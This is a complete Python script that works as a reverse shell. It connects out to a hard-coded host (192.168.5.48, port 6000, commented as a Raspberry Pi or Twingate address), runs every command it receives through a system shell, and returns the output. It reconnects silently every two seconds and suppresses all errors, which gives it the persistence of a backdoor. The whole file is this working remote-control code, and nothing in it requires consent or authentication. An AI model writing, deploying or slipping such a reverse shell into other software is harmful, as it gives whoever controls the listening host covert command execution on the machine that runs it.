import socket
import subprocess
import os
import time

PI_HOST = "192.168.5.48"  # Pi IP (or Twingate IP)
PI_PORT = 6000
cwd = os.getcwd()

def connect_to_pi():
    global cwd
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((PI_HOST, PI_PORT))

            while True:
                data = client.recv(4096)
                if not data:
                    break
                cmd = data.decode().strip()

                # Handle cd commands
                if cmd.lower().startswith("cd"):
                    path = cmd[3:].strip()
                    if not path:
                        cwd = os.path.expanduser("~")
                    else:
                        new_path = os.path.abspath(os.path.join(cwd, path))
                        if os.path.isdir(new_path):
                            cwd = new_path
                            client.sendall(f"{cwd}> \n".encode())
                            continue
                        else:
                            client.sendall(f"The system cannot find the path specified.\n".encode())
                            continue

                # Handle cls locally
                if cmd.lower() == "cls":
                    client.sendall(b"\x1b[2J\x1b[H")  # ANSI escape sequence for clearing terminal
                    continue

                # Run command
                try:
                    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "\n"
                except Exception as e:
                    output = f"Error: {e}\n"

                client.sendall(output.encode())
        except:
            time.sleep(2)  # retry if connection fails

if __name__ == "__main__":
    connect_to_pi()
